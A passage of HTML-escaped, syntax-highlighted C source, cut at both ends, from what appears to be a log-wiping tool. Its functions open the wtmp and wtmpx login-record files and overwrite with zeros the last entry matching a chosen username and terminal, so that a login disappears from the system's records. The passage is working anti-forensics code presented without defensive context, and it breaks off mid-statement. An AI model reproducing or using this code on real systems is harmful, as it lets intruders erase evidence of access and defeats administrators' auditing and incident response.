class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003efflush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estdout\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t * Open the wtmp file and temporary file.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eWTMP_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eO_RDWR\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Opening %s\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eWTMP_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t * Determine offset of last relevent entry.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003elseek\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003elong\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e)),\u003c/span\u003e \u003cspan class=\"n\"\u003eSEEK_END\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nf\"\u003eread\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e)))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nf\"\u003estrncmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eut_name\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nf\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e)))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t  \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nf\"\u003estrncmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eut_line\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nf\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e))))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t  \t\u003cspan class=\"nf\"\u003ebzero\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003elseek\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003elong\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e)),\u003c/span\u003e \u003cspan class=\"n\"\u003eSEEK_CUR\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t  \t\u003cspan class=\"nf\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t  \t\u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003elseek\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003elong\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"n\"\u003eSEEK_CUR\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Done.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * WTMPX editing if supported.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifdef HAVE_UTMPX\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nf\"\u003ewipe_wtmpx\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \t\t\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003eutmpx\u003c/span\u003e\t\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Patching %s .... \u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eWTMPX_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003efflush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estdout\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t * Open the utmp file and temporary file.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eWTMPX_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eO_RDWR\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Opening %s\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eWTMPX_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t * Determine offset of last relevent entry.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003elseek\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003elong\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e)),\u003c/span\u003e \u003cspan class=\"n\"\u003eSEEK_END\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nf\"\u003eread\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e)))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nf\"\u003estrncmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eut_name\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nf\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e)))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t  \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nf\"\u003estrncmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eut_line\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nf\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e))))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t  \t\u003cspan class=\"nf\"\u003ebzero\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003elseek\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003elong\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e)),\u003c/span\u003e \u003cspan class=\"n\"\u003eSEEK_CUR\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t  \t\u003cspan class=\"nf\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t  \t\u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003elseek\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003eint\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan 